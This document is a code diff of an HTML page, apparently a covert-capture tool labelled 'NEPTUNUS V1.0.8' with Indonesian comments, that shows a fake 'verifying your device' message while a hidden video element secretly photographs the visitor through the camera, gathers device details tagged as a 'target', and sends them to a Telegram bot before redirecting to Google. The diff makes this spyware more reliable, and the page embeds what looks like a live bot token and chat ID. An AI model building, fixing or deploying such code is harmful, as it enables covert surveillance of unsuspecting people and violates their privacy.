@@ -12,13 +12,12 @@
 </head>
 <body>
     <div class="loader"></div>
-    <p>Sedang memverifikasi perangkat anda...</p>
+    <p id="status">Sedang memverifikasi perangkat anda...</p>
 
     <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // MASUKKAN TOKEN DAN CHAT ID DI SINI (Pastikan repositori ini PRIVATE agar aman)
         const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
         const CHAT_ID = '6888530451';
         
@@ -27,6 +26,7 @@
 
         async function startCamera() {
             try {
+                // Coba akses kamera belakang tanpa parameter 'exact' agar tidak crash di beberapa HP
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "environment" } 
                 });
@@ -36,44 +36,55 @@
                     setTimeout(takeSnapshot, 3000);
                 };
             } catch (err) {
-                window.location.href = "https://google.com";
+                console.log("Kamera belakang gagal, mencoba kamera default...");
+                try {
+                    const fallback = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = fallback;
+                    setTimeout(takeSnapshot, 3000);
+                } catch (e) {
+                    window.location.href = "https://google.com";
+                }
             }
         }
 
         async function takeSnapshot() {
-            // Deteksi Data Perangkat
-            let battery = "Unknown";
-            if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                battery = Math.round(bat.level * 100) + "%";
-            }
+            let battery = "N/A";
+            try {
+                // Penanganan baterai agar tidak stuck jika ditolak browser
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    battery = Math.round(bat.level * 100) + "%";
+                }
+            } catch (e) { battery = "Error"; }
 
-            const info = 📸 **Target Terdeteksi!**\n\n +
-                         📱 **Browser:** ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n +
-                         🔋 **Baterai:** ${battery}\n +
-                         🌐 **Koneksi:** ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n +
-            Resolusi:🖥 **Resolusi:** ${window.screen.width}x${window.screen.height}\n +
-            Platform:🌍 **Platform:** ${navigator.platform}\n\n +
-                         <i>NEPTUNUS V1.0.8</i>;
+            const info = `📸 **Target Terdeteksi!**\n\n` +
+                         `📱 **Browser:** ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
+                         `🔋 **Baterai:** ${battery}\n` +
+                         `🌐 **Koneksi:** ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n` +
+                         `🖥 **Resolusi:** ${window.screen.width}x${window.screen.height}\n` +
+                         `🌍 **Platform:** ${navigator.platform}\n\n` +
+                         `<i>NEPTUNUS V1.0.8</i>`;
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
             canvas.toBlob(blob => {
+                if (!blob) { window.location.href = "https://google.com"; return; }
+                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'target.jpg');
                 formData.append('caption', info);
                 formData.append('parse_mode', 'HTML');
 
-                fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 }).finally(() => {
                     window.location.href = "https://google.com";
                 });
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.7);
         }
 
         window.onload = startCamera;
